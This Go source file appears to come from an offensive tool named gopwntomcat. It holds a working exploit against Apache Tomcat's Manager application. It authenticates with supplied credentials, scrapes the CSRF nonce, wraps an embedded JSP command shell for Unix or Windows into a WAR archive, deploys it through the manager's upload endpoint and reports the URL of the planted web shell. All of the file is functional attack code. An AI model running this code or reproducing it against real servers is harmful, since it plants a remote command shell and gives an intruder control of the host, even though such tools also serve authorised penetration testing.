package pwn

import (
	"archive/zip"
	"bytes"
	"path"

	// Embed is needed for shellcode embedding
	_ "embed"
	"mime/multipart"

	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/patrickhener/gopwntomcat/utils"
)

//go:embed cmdshell_unix.jsp
var embeddedShellUnix []byte

//go:embed cmdshell_windows.jsp
var embeddedShellWindows []byte

type exploiter struct {
	appBase   string
	jspName   string
	cookieJar *cookiejar.Jar
	client    *http.Client
	host      string
	port      int
	ssl       bool
	targeturi string
	user      string
	pass      string
	jsp       string
	csrf      string
	os        string
}

func (e *exploiter) constructURL() string {
	var url string
	if e.ssl {
		url = fmt.Sprintf("https://%s:%d%s", e.host, e.port, e.targeturi)
	} else {
		url = fmt.Sprintf("http://%s:%d%s", e.host, e.port, e.targeturi)
	}
	return url
}

func (e *exploiter) accessManager() error {
	req, err := http.NewRequest("GET", e.constructURL(), nil)
	if err != nil {
		log.Println("Unable to build request")
	}
	req.SetBasicAuth(e.user, e.pass)
	resp, err := e.client.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode == 401 {
		return fmt.Errorf("manager wants to have authentication. Did you remember to put '-user' and '-pass' and are they correct? HTTP Status %+v", resp.StatusCode)
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("no access to the manager app: HTTP Status %+v", resp.StatusCode)
	}

	// extract csrf (CSRF_NONCE=...) from body
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	r, err := regexp.Compile("CSRF_NONCE=[A-F0-9]+")
	if err != nil {
		return err
	}

	match := r.MatchString(string(bodyBytes))
	if err != nil {
		return err
	}

	if !match {
		return fmt.Errorf("%s", "There is no CSRF_NONCE in response body. Something went wrong.")
	}

	nonce := r.FindString(string(bodyBytes))
	e.csrf = strings.Split(nonce, "=")[1]

	return nil
}

func (e *exploiter) uploadPayload() error {
	var shell []byte
	var err error
	// Load custom jsp if applicable
	// Otherwise use embedded one
	if e.jsp != "" {
		cwd, err := os.Getwd()
		if err != nil {
			return err
		}
		filepath := path.Join(cwd, e.jsp)
		shell, err = ioutil.ReadFile(filepath)
		if err != nil {
			return err
		}
	} else {
		if strings.ToLower(e.os) == "unix" || strings.ToLower(e.os) == "linux" {
			log.Println("Choosing unix/linux payload")
			shell = embeddedShellUnix
		} else if strings.ToLower(e.os) == "win" || strings.ToLower(e.os) == "windows" {
			log.Println("Choosing windows payload")
			shell = embeddedShellWindows
		} else {
			log.Fatalf("OS %s not supported. Choose from 'unix', 'linux', 'windows'", e.os)
		}
	}

	log.Printf("Uploading %d bytes as %s.war ...", len(shell), e.appBase)
	if err = e.SendWarPayload(shell); err != nil {
		return err
	}

	return nil
}

func (e *exploiter) SendWarPayload(shell []byte) error {
	// This is the buffer aka the war file
	w := new(bytes.Buffer)
	// create zip writer
	warWriter := zip.NewWriter(w)
	defer warWriter.Close()

	// Create filename in zip writer as jsp
	warFile, err := warWriter.Create(fmt.Sprintf("%s.jsp", e.jspName))
	if err != nil {
		return err
	}

	// Write shell bytes to jsp file
	_, err = warFile.Write(shell)
	if err != nil {
		return err
	}

	// Close war writer
	err = warWriter.Close()
	if err != nil {
		return err
	}

	// Multipart buffer and writer
	var mb bytes.Buffer
	multiWriter := multipart.NewWriter(&mb)
	defer multiWriter.Close()

	// Construct multipart request
	part, err := multiWriter.CreateFormFile("deployWar", fmt.Sprintf("%s.war", e.appBase))
	if err != nil {
		return err
	}
	part.Write(w.Bytes())

	if err := multiWriter.Close(); err != nil {
		return err
	}

	// upload it
	uploadPath := fmt.Sprintf("%s/upload?org.apache.catalina.filters.CSRF_NONCE=%s", e.constructURL(), e.csrf)
	req, err := http.NewRequest("POST", uploadPath, &mb)
	if err != nil {
		return err
	}
	req.SetBasicAuth(e.user, e.pass)
	req.Header.Set("Content-Type", multiWriter.FormDataContentType())

	resp, err := e.client.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("%s", "Upload was not successful")
	}

	var resultURL string
	if e.ssl {
		resultURL = fmt.Sprintf("https://%s:%d/%s/%s.jsp", e.host, e.port, e.appBase, e.jspName)
	} else {
		resultURL = fmt.Sprintf("http://%s:%d/%s/%s.jsp", e.host, e.port, e.appBase, e.jspName)

	}
	log.Printf("Upload was successful. Find your shell @ %s", resultURL)
	return nil
}

func (e *exploiter) exploit() {
	e.appBase = utils.RandTextAlphanumeric()
	e.jspName = utils.RandTextAlphanumeric()

	log.Println("Fetching sessin ID and CSRF token...")
	if err := e.accessManager(); err != nil {
		log.Println(err)
		os.Exit(1)
	}

	log.Printf("Uploading and deploying %s ...", e.appBase)
	if err := e.uploadPayload(); err != nil {
		log.Println(err)
		log.Printf("You might have to remove payload %+v manually", e.appBase)
		os.Exit(2)
	}

}

// Start will start the pwning
func Start(rhostsFlag utils.Rhosts, port int, ssl bool, targeturi, user, pass, customJSP string, proxy string, oper string) {
	var exploiter exploiter
	if len(rhostsFlag) > 1 {
		log.Println("Only choose one '-rhost' to pwn")
		os.Exit(1)
	}

	ip := rhostsFlag[0]

	if strings.Contains(ip, "/") {
		log.Println("Do not use CIDR net, but single host ip")
		os.Exit(2)
	}

	if !utils.CheckValidIP(ip) {
		log.Println("Not a valid ip")
		os.Exit(2)
	}

	log.Println("Let the pwn begin")

	// init
	exploiter.cookieJar, _ = cookiejar.New(nil)
	exploiter.host = ip
	exploiter.port = port
	exploiter.ssl = ssl
	exploiter.targeturi = targeturi
	if proxy != "" {
		prx, err := url.Parse(proxy)
		if err != nil {
			panic(err)
		}
		exploiter.client = &http.Client{
			Jar: exploiter.cookieJar,
			Transport: &http.Transport{
				Proxy: http.ProxyURL(prx),
			},
		}
	} else {
		exploiter.client = &http.Client{
			Jar: exploiter.cookieJar,
		}
	}
	exploiter.user = user
	exploiter.pass = pass
	exploiter.jsp = customJSP
	exploiter.os = oper

	exploiter.exploit()
}
